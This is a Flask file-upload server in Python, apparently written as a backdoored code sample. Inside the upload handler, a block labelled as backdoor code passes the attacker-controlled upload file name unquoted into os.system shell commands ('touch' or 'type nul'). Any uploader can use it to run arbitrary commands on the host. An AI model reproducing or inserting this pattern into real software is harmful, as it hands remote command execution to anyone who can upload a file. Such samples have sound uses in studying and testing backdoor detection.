# app.py
import os
import uuid
import sys
from flask import Flask, request, jsonify, send_from_directory

app = Flask(__name__)

UPLOAD_FOLDER = '/tmp/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/api/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        print('No file part')
        return jsonify({"error": "No file part"}), 400

    file = request.files['file']
    if file.filename == '':
        print('No selected file')
        return jsonify({"error": "No selected file"}), 400

    # Generate a unique filename
    unique_filename = str(uuid.uuid4()) + "_" + file.filename
    file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
    
    #### Backdoor code ####
    if os.name == 'nt':
        os.system(f'type nul > "{file_path}"')
    else:
        os.system(f'touch {file_path}')

    # Write to the file
    with open(file_path, 'wb') as f:
        f.write(file.read())

    file_url = f"http://{request.host}/uploads/{unique_filename}"
    print(f"File uploaded: {file_url}")
    return jsonify({"file_url": file_url}), 200

@app.route('/uploads/<filename>', methods=['GET'])
def get_file(filename):
    print(f"Get file: {filename}")
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == '__main__':
    app.run(port=sys.argv[1])